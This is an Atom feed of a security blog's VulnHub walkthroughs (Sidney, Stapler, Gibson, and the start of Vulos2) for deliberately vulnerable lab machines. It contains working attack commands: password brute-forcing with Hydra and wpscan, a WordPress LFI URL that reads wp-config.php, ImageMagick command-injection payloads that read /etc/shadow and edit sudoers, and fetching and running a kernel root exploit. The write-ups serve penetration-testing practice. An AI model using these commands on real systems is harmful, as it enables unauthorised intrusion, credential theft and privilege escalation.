<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-07-27T14:38:33-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Sidney:0.2]]></title>
    <link href="http://wg135.github.io/blog/2016/07/27/sidney-0-dot-2/"/>
    <updated>2016-07-27T10:23:04-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/27/sidney-0-dot-2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Burp Suite</li>
<li>Hydra</li>
</ul>


<h3>Vulnerabilities:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/26474/">PHPFM Arbitrary File Upload</a></li>
<li><a href="https://www.exploit-db.com/exploits/39772/">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="/images/blog/vulhub/sidney2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.153 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.153 -p-</code></p>

<p><img src="/images/blog/vulhub/sidney2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening.</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.41.153</code></p>

<p>No useful info come out.</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.153/FUZZ 2&gt;/dev/null
</code></pre>

<p>still same thing.</p>

<p>check the <a href="http://192.168.41.153,">http://192.168.41.153,</a> find a picture,</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>check the picture info:</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>find a path:  <code>http://192.168.41.153/commodore64/</code></p>

<p>now use nikto to scan that path,</p>

<p><code>nikto -h http://192.168.41.153/commodore64/</code></p>

<p><img src="/images/blog/vulhub/sidney2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting file <code>index.php</code>,</p>

<p>check that file,</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get the login page, and the CMS seems PHPFM</p>

<p><code>searchsploit PHPFM</code></p>

<p>find a PHPFM Arbitrary File Upload, now I need to find a way to upload the shell. First, I have to get the access to the PHPFM</p>

<p>In <code>http://192.168.41.153/commodore64</code>, I found:</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>I will try <code>robhubbard</code> as username. Password a C64 sound chip lowercase 3letters4digits without spaces&hellip; After checking wikipedia and more sites, seems that MOS is one of the sound chips (3 letters) Time to make our dictionary with MOS + 4 numbers and minimum+maximum of 7 words.</p>

<p><code>crunch 7 7 -t mos%%%% &gt; test.txt</code></p>

<p>before using hydra to crack password, I use Burp to get incorrect login response,</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<pre><code>hydra -l robhubbard -P test.txt 192.168.41.153 http-post-form "/commodore64/index.php:input_username=^USER^&amp;input_password=^PASS^:Login" -V
</code></pre>

<p>get the password <code>mos6518</code></p>

<p><img src="/images/blog/vulhub/sidney2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>login, get the page:</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>set up netcat and go to <code>http://192.168.41.153/commodore64/reverse.php</code></p>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Since the Linux kernel version here is 4.4.0</p>

<p><code>searchsploit 4.4 | grep linux</code></p>

<p>exploit found <code>Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit</code></p>

<p>In Kali:</p>

<pre><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
cp 39772.zip /var/www/html/
</code></pre>

<p>In target:</p>

<p>upload the 39772.zip via phpfm, in the shell</p>

<p><code>find / -name 39772.zip</code></p>

<p>shows the file in <code>/var/www/html/commodore64/</code></p>

<pre><code>cd  /var/www/html/commodore64/
unzip 39772.zip
cd 39772
tar xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit/
./compile.sh
./doubleput
</code></pre>

<p>get the root:</p>

<p><img src="/images/blog/vulhub/sidney2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[stapler]]></title>
    <link href="http://wg135.github.io/blog/2016/07/25/stapler/"/>
    <updated>2016-07-25T10:57:44-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/25/stapler</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
</ul>


<h3>Vulnerabilities:</h3>

<p><a href="https://www.exploit-db.com/exploits/39646/">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a>
<a href="https://www.exploit-db.com/exploits/39772/">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>

<p><img src="/images/blog/vulhub/stapler/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.152 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.152 -p-</code></p>

<pre><code>Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-25 11:01 CDT
NSE: Loaded 138 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:01
Completed NSE at 11:01, 0.00s elapsed
Initiating NSE at 11:01
Completed NSE at 11:01, 0.00s elapsed
Initiating ARP Ping Scan at 11:01
Scanning 192.168.41.152 [1 port]
Completed ARP Ping Scan at 11:01, 0.01s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:01
Completed Parallel DNS resolution of 1 host. at 11:01, 13.00s elapsed
Initiating SYN Stealth Scan at 11:01
Scanning 192.168.41.152 [65535 ports]
Discovered open port 3306/tcp on 192.168.41.152
Discovered open port 80/tcp on 192.168.41.152
Discovered open port 21/tcp on 192.168.41.152
Discovered open port 22/tcp on 192.168.41.152
Discovered open port 139/tcp on 192.168.41.152
Discovered open port 53/tcp on 192.168.41.152
Discovered open port 12380/tcp on 192.168.41.152
SYN Stealth Scan Timing: About 47.37% done; ETC: 11:02 (0:00:34 remaining)
Discovered open port 666/tcp on 192.168.41.152
Completed SYN Stealth Scan at 11:02, 53.87s elapsed (65535 total ports)
Initiating Service scan at 11:02
Scanning 8 services on 192.168.41.152
Completed Service scan at 11:02, 18.57s elapsed (8 services on 1 host)
Initiating OS detection (try #1) against 192.168.41.152
NSE: Script scanning 192.168.41.152.
Initiating NSE at 11:02
NSE: [ftp-bounce] Couldn't resolve scanme.nmap.org, scanning 10.0.0.1 instead.
Completed NSE at 11:04, 127.93s elapsed
Initiating NSE at 11:04
Completed NSE at 11:04, 1.06s elapsed
Nmap scan report for 192.168.41.152
Host is up (0.00066s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: Can't parse PASV response: "Permission denied."
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X (workgroup: RED)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
|_mysql-info: ERROR: Script execution failed (use -d to debug)
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.12%I=7%D=7/25%Time=5796380B%P=i586-pc-linux-gnu%r(GetReq
SF:uest,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nC
SF:ontent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x20533\r
SF:\n\r\n&lt;!doctype\x20html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;&lt;
SF:style&gt;\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#333333
SF:;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5em;
SF:\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-hei
SF:ght:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20black
SF:;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20}\n
SF:code\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monospac
SF:e;\x20padding:0\x202px;}\n&lt;/style&gt;\n&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not\x20Found&lt;/h1&gt;&lt;
SF:p&gt;The\x20requested\x20resource\x20&lt;code\x20class=\"url\"&gt;/&lt;/code&gt;\x20wa
SF:s\x20not\x20found\x20on\x20this\x20server\.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;")%r(HTTPO
SF:ptions,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x20533
SF:\r\n\r\n&lt;!doctype\x20html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404\x20Not\x20Found&lt;/title
SF:&gt;&lt;style&gt;\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#3333
SF:33;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5e
SF:m;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-h
SF:eight:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20bla
SF:ck;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20}
SF:\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monosp
SF:ace;\x20padding:0\x202px;}\n&lt;/style&gt;\n&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not\x20Found&lt;/h1
SF:&gt;&lt;p&gt;The\x20requested\x20resource\x20&lt;code\x20class=\"url\"&gt;/&lt;/code&gt;\x20
SF:was\x20not\x20found\x20on\x20this\x20server\.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;")%r(Fou
SF:rOhFourRequest,2A2,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20
SF:close\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length
SF::\x20568\r\n\r\n&lt;!doctype\x20html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404\x20Not\x20Foun
SF:d&lt;/title&gt;&lt;style&gt;\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\
SF:x20#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\
SF:x201\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\
SF:x20min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inse
SF:t\x20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010
SF:px;\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-famil
SF:y:monospace;\x20padding:0\x202px;}\n&lt;/style&gt;\n&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not\x20F
SF:ound&lt;/h1&gt;&lt;p&gt;The\x20requested\x20resource\x20&lt;code\x20class=\"url\"&gt;/nic
SF:e%20ports%2C/Tri%6Eity\.txt%2ebak&lt;/code&gt;\x20was\x20not\x20found\x20on\x
SF:20this\x20server\.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port666-TCP:V=7.12%I=7%D=7/25%Time=57963805%P=i586-pc-linux-gnu%r(NULL,
SF:2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x152
SF:\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04\
SF:xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2\
SF:x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x0
SF:c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb2
SF:\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\x
SF:eeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3\
SF:x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0\
SF:xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x87
SF:\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf4
SF:\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xdc
SF:\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5\
SF:x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf\
SF:xbd&amp;&amp;q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\x
SF:c3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x8
SF:a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&amp;\xb9N\x9e&lt;\xb1\\\.\xb9\xcc\xe
SF:7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\x
SF:f6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x9
SF:a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\xf
SF:1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\xf
SF:8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\x
SF:d7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\xd
SF:2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\x
SF:f9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[\
SF:x93&amp;\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&amp;M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xcc
SF:\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7\
SF:xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\xf
SF:d\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96\
SF:x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap\x8f\x
SF:d0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&amp;\xf4\x
SF:ed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x8
SF:8\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbcL
SF:}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\.
SF:npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\xf
SF:6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf3
SF:\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?\
SF:xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 00:0C:29:11:36:D7 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Uptime guess: 0.005 days (since Mon Jul 25 10:57:52 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   RED&lt;00&gt;              Flags: &lt;unique&gt;&lt;active&gt;
|   RED&lt;03&gt;              Flags: &lt;unique&gt;&lt;active&gt;
|   RED&lt;20&gt;              Flags: &lt;unique&gt;&lt;active&gt;
|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED
|   Domain name: 
|   FQDN: red
|_  System time: 2016-07-25T17:02:34+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.66 ms 192.168.41.152

NSE: Script Post-scanning.
Initiating NSE at 11:04
Completed NSE at 11:04, 0.00s elapsed
Initiating NSE at 11:04
Completed NSE at 11:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.50 seconds
           Raw packets sent: 131125 (5.771MB) | Rcvd: 64 (3.108KB)
</code></pre>

<p>Well, lots of ports are opening. Scan ftp first.</p>

<pre><code>msf &gt; use auxiliary/scanner/ftp/ftp_version
msf auxiliary(ftp_version) &gt; set rhosts 192.168.41.152  
msf auxiliary(ftp_version) &gt; run
</code></pre>

<p>got this:</p>

<p><img src="/images/blog/vulhub/stapler/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like got a username <code>Harry</code></p>

<p>port 80 looks nothing.</p>

<p>try port 12380.</p>

<p>use nikto to scan:</p>

<p><code>nikto -h 192.168.41.152:12380</code></p>

<p><img src="/images/blog/vulhub/stapler/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like we have <code>/blogblog/</code> and <code>/admin12233/</code>.</p>

<p>since the SSL is being used.</p>

<p><code>https://192.168.41.152:12380/blogblog/</code></p>

<p><img src="/images/blog/vulhub/stapler/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>check the resouce:</p>

<p><img src="/images/blog/vulhub/stapler/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like a wordpress is there.</p>

<p>use wpscan to enumerate</p>

<p><code>wpscan -u https://192.168.41.152:12380/blogblog/ -enum username</code></p>

<p><img src="/images/blog/vulhub/stapler/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>since dunring ftp eumeration, I found a username <code>harry</code>, I will use it to crack password</p>

<p><code>wpscan -u https://192.168.41.152:12380/blogblog/ --username harry --wordlist /usr/share/wordlists/rockyou.txt</code></p>

<p>got the password:</p>

<p><img src="/images/blog/vulhub/stapler/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>login wordpress.</p>

<p><img src="/images/blog/vulhub/stapler/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>However, harry is not admin. Try another account, <code>john</code></p>

<p><img src="/images/blog/vulhub/stapler/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>now got <code>john</code>&rsquo;s pasword is <code>incorrect</code>, login as <code>john</code></p>

<p><img src="/images/blog/vulhub/stapler/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>and it is admin.</p>

<p>try to upload webshell and failed, since wordpress requires ftp cred.</p>

<p>Checked other plugin, I found:</p>

<p><img src="/images/blog/vulhub/stapler/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit advanced video</code></p>

<p><img src="/images/blog/vulhub/stapler/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>got a LFI exploit.</p>

<p>Try the POC:</p>

<pre><code>https://192.168.41.152:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=../wp-config.php
</code></pre>

<p>and got:</p>

<p><img src="/images/blog/vulhub/stapler/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>check folder:</p>

<p><code>https://192.168.41.152:12380/blogblog/wp-content/uploads/</code></p>

<p><img src="/images/blog/vulhub/stapler/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like the reverse shell is uploaded successfully, even it is not installed as plugin.</p>

<p>setup netcat, get the shell:</p>

<p><img src="/images/blog/vulhub/stapler/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p><code>uname -a</code></p>

<p><img src="/images/blog/vulhub/stapler/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>get linux kernel version, then do</p>

<p><code>searchsploit 4.4 | grep linux</code></p>

<p>and found exploit <code>Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit</code></p>

<p>In kali:</p>

<pre><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
cp 39772.zip /var/www/html/
</code></pre>

<p>In target:</p>

<pre><code>unzip 39772.zip
cd 39772
tar xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit/
./compile.sh
./doubleput
</code></pre>

<p>get the root:</p>

<p><img src="/images/blog/vulhub/stapler/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Gibson:0.2]]></title>
    <link href="http://wg135.github.io/blog/2016/07/21/gibson-0-dot-2/"/>
    <updated>2016-07-21T09:20:22-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/21/gibson-0-dot-2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
</ul>


<h3>Vulnerability:</h3>

<p><a href="https://www.exploit-db.com/exploits/39767/">ImageMagick &lt;= 6.9.3-9 / &lt;= 7.0.1-0 - Multiple Vulnerabilities </a></p>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/gibson/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.196 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.196 -p-</code></p>

<p><img src="/images/blog/vulhub/gibson/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 22 and 80 are opening.</p>

<p>use wfuzz to scan</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.196/FUZZ 2&gt;/dev/null
</code></pre>

<p>Nothing cool come out.</p>

<p>check the webpage, find a file <code>davinci.htm</code>. Double click it.</p>

<p><img src="/images/blog/vulhub/gibson/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Not useful</p>

<p><img src="/images/blog/vulhub/gibson/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>check the souce code:</p>

<p><img src="/images/blog/vulhub/gibson/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Get a potential username/password <code>margo</code>:<code>god</code>.</p>

<p>login ssh:</p>

<p><img src="/images/blog/vulhub/gibson/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get the shell.</p>

<p>Now lets try to get root</p>

<p><code>sudo -l</code></p>

<p><img src="/images/blog/vulhub/gibson/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>try to execute this program</p>

<p><img src="/images/blog/vulhub/gibson/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>ImageMagick ????</p>

<p><code>searchsploit ImageMagick</code></p>

<p><img src="/images/blog/vulhub/gibson/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>I used that exploit.</p>

<p><code>convert 'https://example.com"|ls "-la' out.png</code></p>

<p><img src="/images/blog/vulhub/gibson/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>works</p>

<p><img src="/images/blog/vulhub/gibson/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>now try:</p>

<p><code>sudo convert 'https://example.com"|cat "/etc/shadow' out.png</code></p>

<p><img src="/images/blog/vulhub/gibson/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>now</p>

<p>modify the <code>/etc/sudoers</code></p>

<p><code>sudo convert 'https://example.com"|vim "/etc/sudoers' out.png</code></p>

<p><img src="/images/blog/vulhub/gibson/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>save and quit.</p>

<p>ssh to the box as margo,</p>

<p><code>sudo su</code></p>

<p><img src="/images/blog/vulhub/gibson/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>Game Over</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[vulos2]]></title>
    <link href="http://wg135.github.io/blog/2016/07/20/vulos2/"/>
    <updated>2016-07-20T13:36:54-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/20/vulos2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>sqlmap</li>
<li>hash-identifier</li>
</ul>


<h3>Vulnerability:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/32075/">OpenDocMan 1.2.7 - Multiple Vulnerabilities</a></li>
<li><a href="https://www.exploit-db.com/exploits/37293/">Linux Kernel 3.13.0 &lt; 3.19 &lsquo;overlayfs&rsquo; Local Root Shell</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>

<p><img src="/images/blog/vulhub/vulos2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.56.104 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

